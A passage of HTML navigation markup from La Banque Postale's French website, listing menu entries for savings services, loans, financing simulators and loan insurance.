                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/pea-et-pea-pme-eti/fiscalite-du-pea-et-du-pea-pme-eti.html" class="a-text--small js-tracking-item">Fiscalité du PEA et du PEA PME-ETI</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Services épargne</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Epargner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Services épargne</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/services-epargne/services-interets-solidaires.html" class="a-text--small js-tracking-item">Services Intérêts Solidaires</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/services-epargne/versements-programmes-regulys.html" class="a-text--small js-tracking-item">Versements programmes Regulys</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/services-epargne/versements-programmes-ccepargne.html" class="a-text--small js-tracking-item">Versements programmes CcéPargne</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2" last-item="">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Simulateurs épargne</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Epargner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Simulateurs épargne</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/simulateurs-epargne/diagnostic-retraite.html" class="a-text--small js-tracking-item">Simulation retraite</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/simulateurs-epargne/diagnostic-succession.html" class="a-text--small js-tracking-item">Simulateur succession</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/simulateurs-epargne/simulateur-impots-sur-le-revenu.html" class="a-text--small js-tracking-item">Simulateur impôt sur le revenu</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/simulateurs-epargne/simulateur-impts-sur-la-fortune.html" class="a-text--small js-tracking-item">Simulateur impôt sur la fortune immobilière (IFI)</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/simulateurs-epargne/simulateur-livret.html" class="a-text--small js-tracking-item">Simulateur livret</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                            </ul>
                                        </div>

                                    </div>
                                </div>
                            </li>

                            <li class="a-navigation__list__item a-navigation__menu__item u-margin-none-xs u-margin-none-sm u-spacing-s-sm" menu-index="0" data-level="1">

                                <button role="button" class="a-navigation__menu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Emprunter</button>
                                <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                <span class="line--wrapper--vertical"></span>
                                <div class="m-header__submenu m-header__panel--mobile">
                                    <div class="m-header__submenu__wrapper">
                                        <div class="m-header__submenu__title m-header__panel__title u-margin-2xl-left u-margin-none-xs u-margin-none-sm u-spacing-lg-bottom">
                                            <div>
                                                <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" data-level="2">
                                <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                    <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                </svg>
                                <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu principal</span>
                            </button>
                                                <p class="a-text--small lato-bold u-text-color--black">Emprunter</p>
                                            </div>
                                            <p class="a-text--small hidden-sm hidden-xs">Financez vos projets grâce à nos solutions de prêts et crédits à la consommation.</p>
                                        </div>
                                        <div class="m-header__submenu__list__wrapper   u-spacing-2xl-left u-spacing-none-sm u-spacing-none-xs">
                                            <span class="submenu-v-line animation-line"></span>
                                            <ul class="m-header__submenu__list u-margin-2xl-right u-margin-none-sm u-margin-none-xs" id="submenu-0">

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Financer mon logement et mes travaux</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Emprunter</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Financer mon logement et mes travaux</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-logement-et-travaux/pret-habitat-taux-fixe.html" class="a-text--small js-tracking-item">Prêt habitat à taux fixe </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-logement-et-travaux/pret-personnel-travaux.html" class="a-text--small js-tracking-item">Prêt personnel Travaux</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-logement-et-travaux/pret-a-taux-zero-ptz.html" class="a-text--small js-tracking-item">Prêt à Taux Zéro</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-logement-et-travaux/eco-pret-a-taux-zero.html" class="a-text--small js-tracking-item">Eco Prêt à Taux Zéro</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-logement-et-travaux/pret-relais.html" class="a-text--small js-tracking-item">Prêt relais</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-logement-et-travaux/pret-conventionne.html" class="a-text--small js-tracking-item">Prêt Conventionné</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-logement-et-travaux/pret-accession-sociale.html" class="a-text--small js-tracking-item">Prêt accession sociale</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-logement-et-travaux/guide-immobilier.html" class="a-text--small js-tracking-item">Guide de l'immobilier : achat, travaux, locatif...</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-logement-et-travaux/toutes-nos-solutions.html" class="a-text--small js-tracking-item">Toutes nos solutions</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Financement de projets</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Emprunter</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Financement de projets</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-de-projets/pret-personnel-projet.html" class="a-text--small js-tracking-item">Prêt personnel projet</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-de-projets/credit-renouvelable.html" class="a-text--small js-tracking-item">Crédit Renouvelable</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-de-projets/financement-participatif.html" class="a-text--small js-tracking-item">Financement participatif</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-de-projets/toutes-nos-solutions.html" class="a-text--small js-tracking-item">Toutes nos solutions</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>
                                                    <a href="/particulier/emprunter/financement-vehicule-pret-personnel-auto.html" class="a-navigation__submenu__item__label a-text--small js-tracking-item">Financement véhicule</a>

                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Emprunter</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Financement véhicule</p>
                                                            </div>
                                                        </div>

                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Financements à destination des jeunes</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Emprunter</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Financements à destination des jeunes</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-a-destination-des-jeunes/pret-personnel-etudiant.html" class="a-text--small js-tracking-item">Prêt personnel Etudiant</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-a-destination-des-jeunes/pret-personnel-apprenti.html" class="a-text--small js-tracking-item">Prêt personnel Apprenti </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-a-destination-des-jeunes/financement-du-permis-de-conduire.html" class="a-text--small js-tracking-item">Prêt Permis à 1€ par jour</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/financement-a-destination-des-jeunes/toutes-nos-solutions.html" class="a-text--small js-tracking-item">Toutes nos solutions</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Gestion de budget</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Emprunter</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Gestion de budget</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/gestion-de-budgets/rachat-de-credit-consommation.html" class="a-text--small js-tracking-item">Rachat de crédits</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/gestion-de-budgets/credit-renouvelable.html" class="a-text--small js-tracking-item">Crédit renouvelable</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/gestion-de-budgets/rachat-credit-immobilier.html" class="a-text--small js-tracking-item">Rachat de crédit immobilier</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/gestion-de-budgets/toutes-nos-solutions.html" class="a-text--small js-tracking-item">Toutes nos solutions</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Assurance de financement</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Emprunter</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Assurance de financement</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/assurance-de-financement/assurance-emprunteur.html" class="a-text--small js-tracking-item">Assurance emprunteur </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/assurance-de-financement/assurance-perte-emploi.html" class="a-text--small js-tracking-item">Assurance perte d'emploi</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/assurance-de-financement/assurance-credit-conso.html" class="a-text--small js-tracking-item">Assurance crédit à la consommation </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/assurance-de-financement/convention-AERAS.html" class="a-text--small js-tracking-item">Convention AERAS</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2" last-item="">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Simulateurs projets</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Emprunter</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Simulateurs projets</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/simulateurs-projets/pret-personnel-global.html" class="a-text--small js-tracking-item">Simulateur crédit à la consommation</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/simulateurs-projets/pret-etudiant.html" class="a-text--small js-tracking-item">Simulateur Prêt étudiant</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/simulateurs-projets/calculette-immo.html" class="a-text--small js-tracking-item">Calculette Prêt immobilier</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/simulateurs-projets/credit-renouvelable.html" class="a-text--small js-tracking-item">Simulateur Crédit renouvelable</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/emprunter/simulateurs-projets/rachat-de-credit.html" class="a-text--small js-tracking-item">Simulateur Regroupement de crédits</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                            </ul>
                                        </div>

                                        <div class="m-header__submenu__push">
                                            <div class="m-header__submenu__push__wrapper">

                                                <div>

                                                    <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">

                                                        <div class="title aem-GridColumn aem-GridColumn--default--12">

                                                            <div data-footnotes="true" class="m-title u-spacing-s-bottom u-text-color--blue  u-color--blue u-align-center">

                                                                <h4>Vous êtes client de La Banque Postale ?</h4>
                                                            </div>
                                                            <div class="js-footnotes-trigger u-hidden--all">
                                                                <ul class="js-footnotes--list">

                                                                </ul>
                                                            </div>
                                                        </div>
                                                        <div class="a-text aem-GridColumn aem-GridColumn--default--12">
                                                            <article class=" u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/edito/text" data-footnotes="true">

                                                                <p style="text-align: center;">Complétez notre formulaire et obtenez votre 1ère simulation de prêt immobilier en ligne.</p>

                                                            </article>
                                                            <div class="js-footnotes-trigger u-hidden--all">
                                                                <ul class="js-footnotes--list">

                                                                </ul>
                                                            </div>
                                                        </div>
                                                        <div class="button aem-GridColumn aem-GridColumn--default--12">

                                                            <div class="m-button u-align-center u-spacing-2xl-bottom" data-component-id="labanquepostale/sitepublic/components/edito/button">
                                                                <a href="https://www.labanquepostale.fr/particulier/connexion-espace-client.html#xtor=CS4-7914-[espace_public]-[Formulaire_Ecredit]-[menu_emprunter]-[https://www.labanquepostale.fr/particulier/connexion-espace-client.html]" class="u-btn m-button--content m-button--secondary" data-internal="false" js-btn-tracking="">

                                                                    <span>
            Demandez votre financement
            
        </span>

                                                                </a>
                                                            </div>

                                                        </div>
                                                        <div class="image aem-GridColumn aem-GridColumn--default--12">

                                                            <div class=" u-spacing-2xl-bottom m-image">

                                                                <picture>

                                                                    <source media="(min-width: px)" srcset="https://www.labanquepostale.fr/content/dam/lbp/images/homepage/LBP-banque-digitale.jpg/jcr:content/renditions/cq5dam.web.1080.1080.jpg , https://www.labanquepostale.fr/content/dam/lbp/images/homepage/LBP-banque-digitale.jpg/jcr:content/renditions/cq5dam.web.3000.3000.jpg 2x">

                                                                    <source media="(min-width: px)" srcset="https://www.labanquepostale.fr/content/dam/lbp/images/homepage/LBP-banque-digitale.jpg/jcr:content/renditions/cq5dam.web.375.375.jpg , https://www.labanquepostale.fr/content/dam/lbp/images/homepage/LBP-banque-digitale.jpg/jcr:content/renditions/cq5dam.web.750.750.jpg 2x">

                                                                    <img src="https://www.labanquepostale.fr/content/dam/lbp/images/homepage/LBP-banque-digitale.jpg/_jcr_content/renditions/cq5dam.web.3000.3000.jpg" width="3000px" height="2000px" class="  a-image--responsive" alt="" loading="lazy">

                                                                </picture>

                                                            </div>
                                                        </div>

                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </li>

                            <li class="a-navigation__list__item a-navigation__menu__item u-margin-none-xs u-margin-none-sm u-spacing-s-sm" menu-index="0" data-level="1">

                                <button role="button" class="a-navigation__menu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Assurer</button>
                                <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                <span class="line--wrapper--vertical"></span>
                                <div class="m-header__submenu m-header__panel--mobile">
                                    <div class="m-header__submenu__wrapper">
